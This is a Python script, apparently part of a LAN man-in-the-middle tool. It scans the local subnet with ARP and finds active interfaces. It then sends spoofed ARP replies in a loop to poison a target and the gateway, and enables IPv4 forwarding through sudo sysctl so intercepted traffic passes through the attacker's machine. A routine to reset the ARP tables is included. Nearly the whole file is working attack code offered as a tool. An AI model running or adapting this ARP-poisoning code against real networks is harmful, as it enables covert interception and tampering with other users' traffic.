import windows
import os
import scapy.all as scapy
import time

settings = {}

# reads settings
with open("puller.settings", "r") as f:
    for line in f.readlines():
        settings_name, setting = line.split(" ")
        settings[settings_name.strip()] = setting.strip()

# list of Active interfaces
def recieve_interface():
    if os.name == "posix":
        cmd = "ip a | grep \"state UP\" | awk -F: '{print $2}' | tr -d ' '"
        interfaces = os.popen(cmd).read()
        interfaces = str(interfaces).split()
        count = 0

        return interfaces
    elif os.name == "nt":
        return windows.receive_interface()
    else:
        return "Invalid operating system"
# Gives all local clients
def RecieveHosts(Subnet):
    import scapy.all as scapy

    Local_Host_Info = {}

    # Validate and convert to /24 network
    parts = Subnet.split(".")
    if len(parts) != 4:
        return {}  # invalid IP
    network = ".".join(parts[:3]) + ".0/24"
    print(network)

    try:
        results = scapy.arping(network, verbose=0)[0]
        for sent, received in results:
            Local_Host_Info[received.psrc] = received.hwsrc
    except Exception as e:
        print("ARP scan failed:", e)
        return {}
    print(Local_Host_Info)
    return Local_Host_Info

# -----------------------
# ARP Spoofer
# -----------------------
def ARP_PacketSpoofer(tip, tmac, spoofip, Router=None):
    if Router is None:
        pkt = scapy.ARP(op=2, pdst=tip, hwdst=tmac, psrc=spoofip)
        scapy.send(pkt, verbose=0)
        scapy.send(pkt, verbose=0)
        del pkt
    else:
        pkt = scapy.ARP(op=2, pdst=tip, hwdst=tmac, psrc=spoofip, hwsrc=Router)
        scapy.send(pkt, verbose=0)
        scapy.send(pkt, verbose=0)



# ------------------------
# Calls the ARP spoofing function
# ------------------------
def Packet_Sender(Target_IP, Target_Mac, Spoofip, SpoofMAC, Router_MAC, stop, reset_arp=False):
    if not reset_arp:
        while not stop.is_set():
            try:
                ARP_PacketSpoofer(Target_IP, Target_Mac, Spoofip)
                ARP_PacketSpoofer(Spoofip, SpoofMAC, Target_IP)
                time.sleep(2)
            except:
                break
    elif reset_arp:
        for l in range(1,3):
            ARP_PacketSpoofer(Target_IP, Target_Mac, Spoofip, Router_MAC)
            ARP_PacketSpoofer(Spoofip, SpoofMAC, Target_IP, Router_MAC)
            time.sleep(2)

# ------------------------
# Traffic Fowarding
# ------------------------
def Allow_ipv4_fowarding(status, interface):
    ##0 off
    ##1 on
    if os.name == "posix":
        if settings["mobile"] == "no":
            with os.popen("sudo sysctl net.ipv4.ip_forward") as status_:
                if status_.read().strip() == "net.ipv4.ip_forward = 0":

                    if status == 1:
                        os.system("sudo sysctl -w net.ipv4.ip_forward=1")
            if status == 0:
                os.system("sudo sysctl -w net.ipv4.ip_forward=0")

            del status
            del status_
    elif os.name == "nt":
        if status == 1:
            windows.enable_ipv4_forwarding_win(interface, 1)
        if status == 0:
            windows.enable_ipv4_forwarding_win(interface, 0)